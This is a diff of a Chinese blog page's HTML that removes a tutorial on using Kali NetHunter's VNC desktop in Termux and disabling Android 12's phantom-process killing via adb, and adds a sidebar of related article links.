-<p><code>nh kex</code>		打开vnc图形化界面（普通权限）<strong><font style="color:#DF2A3F;">首次使用需要配置密码（还会问你要不要设一个仅观看的vnc密码，自行选择是否启用）</font></strong></p>
-<p><code>nh kex stop</code>	停止桌面服务</p>
-<h2 id="使用vnc连接可视化界面">使用VNC连接可视化界面
-</h2><p>下载安装app：<strong>VNC Viewer</strong> ，下载地址：<a class="link" href="https://www.lanzouo.com/i8Uf14aelmb"  target="_blank" rel="noopener"
-    >VNC-Viewer 蓝奏云</a></p>
-<p>在Termux中输入以下指令启动图形化界面：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nh kex
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这时会下面会输出地址和端口，一般为<code>127.0.0.1:5901</code></p>
-<p>在VNC中填写地址和端口后设置画质为<strong>高画质</strong>后点击连接</p>
-<p>要求输入密码，填写你创建的密码即可</p>
-<h2 id="问题解决vnc服务停止输出process-completed-signal-9">问题解决：VNC服务停止，输出Process-completed-signal-9
-</h2><h3 id="简述">简述
-</h3><p>使用Termux安装Kali发行版，用RealVNC Viewer登入系统，没过几秒就会收到The connection closed unexpectedly的警告！</p>
-<p>接着回到Termux，看到终端机显示[Process completed (signal 9) - press Enter]的错误，原来是Termux的行程被Android系统中止了，但是手机RAM明明还够用啊？</p>
-<p>此问题源自于Android 12引入的新机制，下面简述原因，以及提供暂时的解决方法。</p>
-<p>Termux发生signal 9错误的原因：agnostic-apollo在Phantom, Cached And Empty Processes一文中详述了Android 12引进的新机制。Android系统将会监控APP所fork出来的子行程，并在达到32个以上子行程后将其终止，避免占用过多CPU资源。</p>
-<p>此一机制称为&quot;Phantom Processes Killing&quot;，因为开发者最害怕看到这种情况，得名影子行程杀手。</p>
-<p>在开发者要求下，Google于Android 12L以及Android 13以上版本加入了关闭Phantom Processes Killing的选项settings_enable_monitor_phantom_procs，然而使用者还是要手动使用ADB指令关闭。因此这是Google Android的问题，Temrux开发者尚未找到正式解决办法，下面指令停用的办法是agnostic-apollo提出的。</p>
-<p>以Termux来说，Phantom Processes Killing会导致Termux执行指令的时候被系统随机中止。Proot distro若要跑图形环境自然就会制造更多子行程了吧。尤其在切换到后台，要用VNC Viewer连线的时候，就会触发Phantom Processes Killing，不管手机RAM有多大。接著回到Termux便会看到[Process completed (signal 9) - press Enter]的错误讯息。</p>
-<p>解决Termux的signal 9错误执行指令将Phantom Processes Killing停用即可，虽然会导致某些APP的背景行程跟著不受控制。</p>
-<p>以下假定Android手机皆有安装Google Play服务框架，因为GMS会不定时覆写装置设定，所以要一并将其关闭。然而关闭GMS覆写可能会导致手机卡开机。</p>
-<h3 id="如果手机没有root权限">如果手机没有Root权限
-</h3><p><a class="link" href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn"  target="_blank" rel="noopener"
-    >点击下载Windows版adb工具包</a>并且解压缩。</p>
-<p>进入platform_tools目录，会看到ADB和Fastboot的执行档。在这里按SHIFT + 右键，开启终端机(或Powershell)。</p>
-<p>手机开启系统设定→关于手机，版本号码点5下，之后搜寻“开发人员选项”进去开启“ADB侦错”。</p>
-<p>将手机插上电脑，于Windows的终端机输入以下指令，在手机上同意侦错。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">adb devices		检测设备
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>接著按照Android版本，执行以下指令：</strong></p>
-<p><strong>Android 12L和Android 13：</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">/adb shell &#34;settings put global settings_enable_monitor_phantom_procs false&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>Android 12：</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">adb shell &#34;/system/bin/device_config set_sync_disabled_for_tests persistent; /system/bin/device_config put activity_manager max_phantom_processes 2147483647&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>执行<code>reboot</code>或手动重启，完成。</p>
-<h3 id="如果手机有root权限">如果手机有Root权限
-</h3><p>开启Termux，切换到su，取得root权限</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">su #取得root权限
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>按照Android版本执行指令。</p>
-<p><strong>Android 12L和Android 13以上：</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">su -c &#34;settings put global settings_enable_monitor_phantom_procs false&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>Android 12：</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">su -c &#34;/system/bin/device_config set_sync_disabled_for_tests persistent; /system/bin/device_config put activity_manager max_phantom_processes 2147483647&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>执行<code>reboot</code>或手动重启，完成。</p>
 
 </section>
 
@@ -730,6 +715,80 @@
     
 
     
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.14 自启动和DOS攻击初步</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.13-%E6%9B%B4%E5%A4%9A%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.13  更多木马程序</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.12-%E8%BF%9B%E9%98%B6%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.12 进阶后门操作</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.11-linux%E6%8F%90%E6%9D%83%E7%BB%AD%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.11 Linux提权(续)和钓鱼网站</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.10-linux%E6%8F%90%E6%9D%83%E5%92%8C%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.10 Linux提权和密码破解</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
 
      
     
